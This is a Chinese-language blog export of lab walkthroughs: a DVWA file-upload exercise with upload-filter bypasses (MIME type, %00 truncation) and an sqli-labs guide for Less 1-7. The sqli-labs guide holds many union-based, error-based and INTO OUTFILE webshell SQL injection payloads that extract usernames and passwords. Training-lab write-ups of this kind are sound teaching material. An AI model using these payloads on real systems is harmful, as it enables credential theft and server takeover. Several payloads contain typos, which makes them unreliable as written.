<h2 id="方法一：抓包修改文件的type"><a href="#方法一：抓包修改文件的type" class="headerlink" title="方法一：抓包修改文件的type"></a>方法一：抓包修改文件的type</h2><p>因为这里过滤的是文件的上传类型，而不是文件的后缀名</p>
<h2 id="方法二：00截断"><a href="#方法二：00截断" class="headerlink" title="方法二：00截断"></a>方法二：00截断</h2><p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断</p>
<p>先上传一个木马，抓包：</p>
<img src="/2019/09/04/DVMA-File-Upload/2.jpg">
<p>修改后发送：</p>
<img src="/2019/09/04/DVMA-File-Upload/3.jpg">
<p>getmuma. php中的空格的16进制为20，需把他改为00</p>
<img src="/2019/09/04/DVMA-File-Upload/4.jpg">

<h1 id="High"><a href="#High" class="headerlink" title="High:"></a>High:</h1><p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>); </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder? </span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="关键函数：-1"><a href="#关键函数：-1" class="headerlink" title="关键函数："></a>关键函数：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strtolower() : 函数把字符串转换为小写。</span><br><span class="line"></span><br><span class="line">strrpos(string,find,start):函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回<span class="literal">false</span>，可选参数start规定在何处开始搜索。</span><br><span class="line"></span><br><span class="line">getimagesize(string filename) ：函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</span><br></pre></td></tr></table></figure>

<p>High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”.jpg”、”.jpeg”、”.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型</p>
<p>因为上传的文件为图片类型，因此服务器将上传的文件解析成图片文件，所以若向其发送请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。这里可以借助Medium级别的文件包含漏洞来获取webshell权限，具体文件包含的方法可参考(Upload-labs)<a href="https://ddstick.github.io/2019/07/31/Upload-labs/#Pass-13-%E5%9B%BE%E7%89%87%E9%A9%AC">https://ddstick.github.io/2019/07/31/Upload-labs/#Pass-13-%E5%9B%BE%E7%89%87%E9%A9%AC</a></p>
<p>方法二：<br>采用%00截断的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片，且只能在php版本小于5.3.4的服务器中</p>
<h1 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h1><p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>); </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">'hackable/uploads/'</span>; </span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; </span></span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext; </span><br><span class="line">    $temp_file     = ( ( ini_get( <span class="string">'upload_tmp_dir'</span> ) == <span class="string">''</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">'upload_tmp_dir'</span> ) ) ); </span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext; </span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">'jpg'</span> || strtolower( $uploaded_ext ) == <span class="string">'jpeg'</span> || strtolower( $uploaded_ext ) == <span class="string">'png'</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_type == <span class="string">'image/jpeg'</span> || $uploaded_type == <span class="string">'image/png'</span> ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) </span></span><br><span class="line">        <span class="keyword">if</span>( $uploaded_type == <span class="string">'image/jpeg'</span> ) &#123; </span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp ); </span><br><span class="line">            imagejpeg( $img, $temp_file, <span class="number">100</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp ); </span><br><span class="line">            imagepng( $img, $temp_file, <span class="number">9</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        imagedestroy( $img ); </span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder? </span></span><br><span class="line">        <span class="keyword">if</span>( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;a href='$&#123;target_path&#125;$&#123;target_file&#125;'&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">// Delete any temp files </span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( $temp_file ) ) </span><br><span class="line">            unlink( $temp_file ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="关键函数：-2"><a href="#关键函数：-2" class="headerlink" title="关键函数："></a>关键函数：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">in_get(varname)：函数返回相应选项的值</span><br><span class="line"></span><br><span class="line">imagecreatefromjpeg ( filename ) ：函数返回图片文件的图像标识，失败返回<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">imagejpeg ( image , filename , quality) ：从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。</span><br><span class="line"></span><br><span class="line">imagedestroy( img ) ： 函数销毁图像资源</span><br><span class="line"></span><br><span class="line">getchwd() 函数返回当前工作目录</span><br></pre></td></tr></table></figure>

<p>可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件</p>
<p>web安全之token和CSRF攻击<a href="https://blog.csdn.net/qq_15096707/article/details/51307024" target="_blank" rel="noopener">https://blog.csdn.net/qq_15096707/article/details/51307024</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Sqli-labs-GET Part 1-10]]></title>
      <url>/2019/08/10/Sqli-labs-GET%20Part%201-10/</url>
      <content type="html"><![CDATA[<p><a href="#Sqli-labs注入练习" title="Sqli-labs注入练习"></a>Sqli-labs注入练习</p>
<p>SQL Injection：是Web程序代码中对于用户提交的参数未做过滤就直接放到SQL语句中执行，导致参数中的特殊字符打破了SQL语句原有逻辑，可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p>
<p>sqli-labs是一个非常好的学习sql注入的一个游戏教程，对于了解sqlmap的原理很有帮助。</p>
<p>项目地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a><a href="#安装" title="安装"></a>安装</h2><p>首先安装phpstudy或者xampp</p>
<p>将下载的文件解压发在：phpstudy的WWW文件夹里 或者 xampp里面的htdocs文件夹里面</p>
<p><strong>修改mysql文件的账号密码：</strong></p>
<p>在sqli-labs-master\sql-connections里面有个db-creds.inc文件，打开并修改账号密码</p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/0.1.jpg">

<p><strong>进入页面进行安装</strong></p>
<p>打开网页输入：localhost/sqli-labs-master</p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/0.2.jpg">

<p>点击第一个：Setup/reset Database for labs 出现下面页面为正确</p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/0.3.jpg">

<p>返回</p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/0.4.jpg">

<p>完成</p>
<h1 id="Less-1：基于错误的-get-单引号-字符型注入"><a href="#Less-1：基于错误的-get-单引号-字符型注入" class="headerlink" title="Less-1：基于错误的_get_单引号_字符型注入"></a><a href="#Less-1：基于错误的-get-单引号-字符型注入" title="Less-1：基于错误的_get_单引号_字符型注入"></a>Less-1：基于错误的_get_单引号_字符型注入</h1><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.1.png">

<p>Please input the ID as parameter with numeric value //“请输入ID为数值的参数”</p>
<p>所以我们在url后输入：?id=1，回车，得到下面的页面：</p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.2.png">

<p>输一个id值，返回了name和password，接着测试是否能注入，url后加上?id=1’，发现报错了，直接报的数据库的错，对web浏览器用户透明，那么可以从报错中得到很多信息，比如这是个MySQL的数据库，还可以猜想到后台的sql语句，应该是</p>
<p>1  </p>
<p>“SELECT * FROM table_name WHERE id=’$_get[‘id’]‘ LIMIT 0,1”  </p>
<p>这种，说明他没有过滤单引号，并且id是char型的输入，之所以报错是因为用了单引号，导致后面的部分“’LIMT 0,1;”多余出来了</p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.3.png">

<p>于是构造sql语句-1‘OR’1’=’1’–+屏蔽掉后面的，也可以用#屏蔽，但这里#没有被url编码，故需自己将他转成url编码%23<br>1’=’1’为万能密码之一</p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.4.png">

<p>注入成功~接着来猜字段<strong>1’ order by 3</strong>，有3个字段存在<br><strong>1’ order by 3：</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.5.png">

<p>再试试4个,没有第4个字段了，即没有第4列<br><strong>1’ order by 4：</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.6.png">

<p>接着用union 语句爆字段，但始终只显示一条记录，看了下源码，发现他并没有将结果循环输出，而是只返回符合查询结果的第一条记录</p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.7.jpg">

<p>于是利用联合查询的特点，使原查询左边为空，那么我们定义的查询结果便可以返回出来<br><strong>-1’ union select 1,2,3%23</strong><br>之所以改为id=-1而不是继续id=1,是因为id=1或者其他正整数的时候,会有规定的数据取出,查看了dalao的WP发现这是因为在index.php中并没有循环取出数据,因此只要把1改为0或者负数即可</p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.8.png">

<p>于是我们可以通过这里使用数据库的函数来爆出数据库的信息，构造如下语句<br><strong>-1’ union select 1,2,concat_ws(char(32,44,32),user(),database());%23</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.9.jpg">

<p>这里用到的数据库函数有cancat_ws()，char()，user()，database()，cancat_ws()是连接函数，第一个参数是分隔符，同样作用的函数还有cancat()，不同的是cancat()有不同的连接符，char()函数是将十进制参数转换成对应的acsii码，user()和database()都是内置的函数，分别返回用户名和数据库名，类似的函数还有version()，返回数据库的版本信息，但是没有直接返回表名的函数，所以需要通过其他方式获取表名</p>
<p>这里有一个很经典的方法，我们可以通过系统数据库information_schema来获取表名，information_schema数据库中含有很重要的三张表：SCHEMATA，TABLES和COLUMNS<br>SCHEMATA表中存储了MySQL中所有数据库的信息，包括数据库名，编码类型路径等，show databases的结果取之此表</p>
<p>TABLES表中存储了MySQL中所有数据库的表的信息（当然，索引是根据数据库名的），包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等，show tables from schemaname的结果取之此表</p>
<p>COLUMNS表中存储了MySQL中所有表的字段信息，show columns from schemaname.tablename的结果取之此表</p>
<p>于是，我们可以构造<strong>?id=-1’ union select 1,2,table_name from information_schema where table_schema=’security’%23</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.10.jpg">

<p>这样就爆出了第一张表名，但要获取所有表名还需要用到’limit’，limit是用来指定范围，他有两个参数（limit a，b）a是从第几行开始取，b是取多少行，但需要注意的是实际取出来的开始行下标比a大1，即limit 5,10是表示取6到15行数据，接下来我们就可以用它取指定范围的表了<br><strong>-1’ union select 1,2,table_name from information_schema.tables where table_schema=’security’ limit 3,1–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.11.jpg">

<p>这里取的是第4张表，如果超出能取的范围，他会报错<br><strong>-1’ union select 1,2,table_name from information_schema.tables where table_schema=’security’ limit 4,1–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.12.jpg">

<p>于是通过修改limit的范围我们获取到了所有的表名，且与数据库中的表名一致，其中users表用来存储用户信息的可能性最大，于是，我们可以用同样的方法爆他的字段名<br><strong>-1’ union select 1,2,column_name from information_schema.colums where table_schema=’security’ and table_name=’users’ limit 0,1%23</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.13.jpg">

<p>获取到的字段名有三个id，username，password，于是我们就可以构造语句了<br><strong>-1’ union select 1,2,concat_ws(char(32,44,32),id,username,password) from users limit 0,1 %23</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.14.jpg">

<p>同样的，改变limit的范围以获取所有用户信息<br><strong>-1’ union select 1,2,concat_ws(char(32,44,32),id,username,password) from users limit 1,1 %23</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.15.jpg">

<p>还有一种方法是通过group分组代替limit将所有信息列出来，查找表名可以构造如下payload：<br><strong>-1’ union select 1,2,gruop_concat(char(32),table_name,char(32)) from information_schema.tables where talbe_schema=’security’–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.16.jpg">

<p>查找字段也是同样<br><strong>-1’ union select 1,2,gruop_concat(char(32),column_name,char(32)) from information_schema.columns where talbe_schema=’security’ and table_name=’users’–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.17.jpg">

<p>最后的payload可以合并不同的列，上下对应输出<br><strong>-1’ union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.18.jpg">

<h1 id="Less-2：基于错误的-get-整型注入"><a href="#Less-2：基于错误的-get-整型注入" class="headerlink" title="Less-2：基于错误的_get_整型注入"></a><a href="#Less-2：基于错误的-get-整型注入" title="Less-2：基于错误的_get_整型注入"></a>Less-2：基于错误的_get_整型注入</h1><p>开头跟les1一样<br>尝试单引号：<strong>?id=’</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/2.1.jpg">

<p>这里的报错与less-1不同了，从报错可以看出，此处的id是当做数值来处理的，因为sql语句对于数字型的数据可以不加单引号，而less-1是作为字符串来处理的，猜想后台sql语句应该是select * from table_name where id = $_get[‘id’] limit 0,1于是构造-1 or 1=1<br><strong>?id=-1 or 1=1%23</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/2.2.jpg">

<p>可以注入，接着用和之前相同的方法先报数据库名，然后是表名，接着是字段，最后的payload如下<br><strong>?id=-1 union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/2.3.jpg">

<h1 id="Less-3：基于报错的-get-单引号-变形-字符型注入"><a href="#Less-3：基于报错的-get-单引号-变形-字符型注入" class="headerlink" title="Less-3：基于报错的_get_单引号_变形_字符型注入"></a><a href="#Less-3：基于报错的-get-单引号-变形-字符型注入" title="Less-3：基于报错的_get_单引号_变形_字符型注入"></a>Less-3：基于报错的_get_单引号_变形_字符型注入</h1><p><strong>?id=’</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/3.1.jpg">

<p>查看源代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=('<span class="variable">$id</span>') LIMIT 0,1"</span>;  </span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);  </span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>

<p>看报错，所谓变形就是用)代替了空格，猜想后台sql是select * from table_name where id =(‘$_get[‘id’]’)limit 0,1于是构造-1’)or’1’=’1’–+<br><strong>?id=-1’)or’1’=’1’–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/3.2.jpg">

<p>最后的payload:<br><strong>?id=-1’) union select 1,username,concat_ws(char(32,44,32),id,database(),password) from users limit 1,1%23</strong></p>
<h1 id="Less-4：基于错误的-get-双引号-字符型注入"><a href="#Less-4：基于错误的-get-双引号-字符型注入" class="headerlink" title="Less-4：基于错误的_get_双引号_字符型注入"></a><a href="#Less-4：基于错误的-get-双引号-字符型注入" title="Less-4：基于错误的_get_双引号_字符型注入"></a>Less-4：基于错误的_get_双引号_字符型注入</h1><p><strong>?id=-1’</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/4.1.jpg">

<p>尝试单引号正常无报错信息，因为在php中双引号可以包含单引号，输入单引号后台就变成了id=(“$_GET[‘id’]’”)</p>

<p>于是尝试双引号，查看报错信息，猜想后台sql语句为select * from table_name where id =(“$_get[‘id’]”)limit 0,1；构造如下sql注入：<br><strong>?id=-1”)or 1=1–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/4.3.jpg">

<p>payload:<br><strong>?id=-1”) union select 1,username,concat_ws(char(32,44,32),id,database(),password) from users limit 0,1%23</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/4.4.jpg">

<h1 id="less-5：双注入-get-单引号-字符型注入"><a href="#less-5：双注入-get-单引号-字符型注入" class="headerlink" title="less-5：双注入_get_单引号_字符型注入"></a><a href="#less-5：双注入-get-单引号-字符型注入" title="less-5：双注入_get_单引号_字符型注入"></a>less-5：双注入_get_单引号_字符型注入</h1><p>当输入?id=1时页面显示正常<br><strong>?id=1</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/5.1.jpg">

<p>什么都没有，然后注意到提示是“双注入”，于是百度了一下，总结如下：</p>
<h2 id="双注入查询"><a href="#双注入查询" class="headerlink" title="双注入查询"></a><a href="#双注入查询" title="双注入查询"></a>双注入查询</h2><p>双查询注入顾名思义形式上是两个嵌套的查询，即select …(select …)，里面的那个select被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rand()随机函数，返回0~1之间的某个值  </span><br><span class="line">floor(a)取整函数，返回小于等于a，且值最接近a的一个整数  </span><br><span class="line">count()聚合函数也称作计数函数，返回查询对象的总数  </span><br><span class="line">group by cluase分组语句，按照cluase对查询结果分组</span><br></pre></td></tr></table></figure>

<p>双注入的原理总的来说就是，当一个聚合函数后面出现group分组语句时，会将查询的一部分结果以报错的形式返回，他有一个固定的公式，于是payload构造如下：<br><strong>?id=-1’ union select count(_),2,concat(‘_‘,(select database()),’_‘,floor(rand()_2)) as a from information_schema.tables group by a–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/5.2.jpg">

<p>获取到数据库名后再用同样的方法获取表名<br><strong>?id=-1’ union select count(_),2,concat(‘_‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),’_‘,floor(rand()_2)) as a from information_schema.tables group by a–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/5.3.jpg">

<p>然后是用户信息，这里只能查询一行，所以不能用group_concat，可以修改limit的范围来遍历用户信息<br><strong>?id=-1’ union select count(_),2,concat(‘_‘,(select concat_ws(char(32,44,32),id,username,password) from users limit 0,1),’_‘,floor(rand()_2)) as a from information_schema.tables group by a–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/5.4.jpg">

<h1 id="Less-6：双注入-get-双引号-字符型注入"><a href="#Less-6：双注入-get-双引号-字符型注入" class="headerlink" title="Less-6：双注入_get_双引号_字符型注入"></a><a href="#Less-6：双注入-get-双引号-字符型注入" title="Less-6：双注入_get_双引号_字符型注入"></a>Less-6：双注入_get_双引号_字符型注入</h1><p>换汤不换药，按照Less-5的方法，只是把单引号改成了双引号，直接上payload:<br><strong>?id=-1” union select count(_),2,concat(‘_‘,(select concat_ws(char(44),id,username,password) from users limit 1,1),’_‘,floor(rand()_2)) as a from information_schema.tables group by a–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/6.1.jpg">

<h1 id="Less-7：导出文件-get-字符型注入"><a href="#Less-7：导出文件-get-字符型注入" class="headerlink" title="Less-7：导出文件_get_字符型注入"></a><a href="#Less-7：导出文件-get-字符型注入" title="Less-7：导出文件_get_字符型注入"></a>Less-7：导出文件_get_字符型注入</h1><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/7.1.jpg">

<p>尝试之前的方法行不通了，他把报错做了处理统一返回“You have an error in your SQL syntax”，明显的，他也给出了提示use outfile，outfile的固定结构是：</p>
<p>1  </p>
<p>select A into outfile B  </p>
<p>这里的B通常是一个文件路径，A可以是文本内容（小马），也可以是数据库信息，于是这里就有两种思路：</p>
<h2 id="第一种，将小马写入文件中，用菜刀拿下："><a href="#第一种，将小马写入文件中，用菜刀拿下：" class="headerlink" title="第一种，将小马写入文件中，用菜刀拿下："></a><a href="#第一种，将小马写入文件中，用菜刀拿下：" title="第一种，将小马写入文件中，用菜刀拿下："></a>第一种，将小马写入文件中，用菜刀拿下：</h2><p>所以大概要使用文件导出。Mysql数据库需要在指定的目录下进行数据的导出，secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行LOAD DATA、SELECT … INTO OUTFILE语句和LOAD_FILE()函数。这些操作需要用户具有FILE权限。<br>如果这个参数为空，这个变量没有效果；<br>如果这个参数设为一个目录名，MySQL服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它；<br>如果这个参数为NULL，MySQL服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。<br><strong>show variables like ‘%secure%’;</strong></p>


<p><strong>?id=-1’)) union select 1,2,’‘ into outfile “/var/lib/mysql-files/DD.php”–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/7.3.jpg">



<p>但看了其他daloa的wp，都涉及到路径的转义<br>dalao都是在Win下操作的，所以需要，而Linux和Win不同，所有此处不太一样</p>
